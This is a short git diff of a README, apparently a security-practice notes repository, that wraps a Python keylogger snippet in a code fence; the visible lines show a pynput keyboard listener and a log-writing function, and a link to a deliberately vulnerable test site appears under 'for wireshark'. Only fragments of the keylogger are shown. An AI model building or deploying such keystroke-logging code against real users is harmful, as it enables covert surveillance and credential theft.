@@ -1,6 +1,7 @@
 # osmf
 ##keylogger code
 
+```python
 from pynput import keyboard as k
 
 def log_write(data):
@@ -24,7 +25,7 @@ log_write("\nNew session Started\n")
 
 with k.Listener(on_release=write) as l:
     l.join()
-
+```
 
 ##for wireshark
 https://testasp.vulnweb.com/ 
